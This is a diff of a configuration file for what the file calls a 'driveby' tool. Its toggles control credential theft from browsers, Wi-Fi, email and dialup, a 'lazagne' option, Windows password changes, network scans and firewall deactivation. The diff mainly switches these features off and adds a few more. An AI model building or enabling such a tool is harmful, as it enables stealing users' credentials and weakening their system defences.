@@ -1,11 +1,10 @@
-# configuration file for controlling the driveby
-# main control type binary [1 - 0]; exception: direct input
-# For direct input use _blank_("") as "null" value and NOT null and whitespaces
+# Reference in the "cheat sheat.rtf" file
 
 # ->initializing controls
 exec_mode = "normal"
 uac_elevation = 0
 duplicate_exec = 1
+multi_arch = 1
 
 # ->completion controls
 msgbox = {
@@ -22,33 +21,35 @@ power = {
 }
 
 # ->password recovery
-browser_pwds = 1
-wireless_keys = 1
-email_pst_pwds = 1
-mail_pwds = 1
-network_pwds = 1
-msn_pwds = 1
-dialup_pwds = 1
+browser_pwds = 0
+wireless_keys = 0
+email_pst_pwds = 0
+mail_pwds = 0
+network_pwds = 0
+msn_pwds = 0
+dialup_pwds = 0
+lazagne = 0
 
 # ->password moding
 change_nt_pwd = {
-    'current_acc_controller': 1,
-    'current_acc_pwd': "windows password",
+    'current_acc_controller': 0,
+    'current_acc_pwd': "",
     'diff_acc_controller': 0,
     'diff_acc_usr': "username",
     'diff_acc_pwd': "a password"
 }
 
-# ->information gathering
+# ->recon
 batch_info = 1
-network_scan = 1
+network_scan = 0
 
-# ->network based execs
-deactivate_firewall = 1
-activate_firewall = 1
-release_ip_adapters = 1
-renew_ip_adapters = 1
-
+# ->network based executions
+deactivate_firewall = 0
+activate_firewall = 0
+release_net_adapters = 0
+renew_net_adapters = 0
+flush_dns = 0
+register_dns = 0
 
 # ->file utilities
 injector = {
